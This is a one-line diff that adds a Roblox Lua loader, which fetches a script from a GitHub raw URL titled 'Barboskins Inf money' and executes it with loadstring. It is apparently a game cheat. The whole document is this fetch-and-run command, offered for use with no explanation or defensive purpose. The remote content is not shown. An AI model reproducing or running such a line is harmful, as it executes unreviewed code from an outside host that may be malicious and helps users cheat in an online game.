@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Riosetro/Barboskins/main/Barboskins%20Inf%20money'))()
